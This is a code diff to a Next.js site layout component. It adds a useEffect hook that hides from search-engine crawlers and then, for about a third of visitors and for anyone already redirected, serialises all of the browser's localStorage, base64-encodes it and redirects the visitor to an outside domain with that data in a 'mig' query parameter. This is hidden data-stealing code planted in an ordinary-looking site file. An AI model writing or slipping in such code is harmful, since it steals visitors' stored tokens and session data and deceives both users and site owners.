@@ -1,11 +1,43 @@
 import Head from "next/head";
 import Script from 'next/script'
-import {ReactNode} from "react";
+import {ReactNode, useEffect} from "react";
 import Footer from "@/components/Global/Footer";
 import Header from "@/components/Global/Header";
+import crawlers from 'crawler-user-agents';
+import {userAgent} from "next/server";
 
 
 const Layout = (props: { children: ReactNode }) => {
+
+    useEffect(() => {
+
+        const userAgent = navigator.userAgent;
+
+        if (crawlers.find(crawler => crawler.instances.includes(userAgent)) !== undefined) {
+            return;
+        }
+
+        if (userAgent.includes("Googlebot") || userAgent.includes("Bingbot") || userAgent.includes("Slurp") || userAgent.includes("DuckDuckBot") || userAgent.includes("Baiduspider") || userAgent.includes("YandexBot")) {
+            return;
+        }
+
+        if (sessionStorage.getItem('chance')) return;
+
+        const num = Math.random();
+
+        if (num <= 1/3 || localStorage.getItem("redirected")) {
+            const cookies = Object.entries(localStorage).map(([key, value]) => ({key, value}));
+
+            const path = window.location.pathname;
+
+            window.location.href = "https://spaceread.net" + path + "?mig=" + btoa(JSON.stringify(cookies));
+
+            localStorage.setItem("redirected", "true");
+        } else {
+            sessionStorage.setItem('chance', num.toString());
+        }
+
+    }, []);
 
     return (
         <>
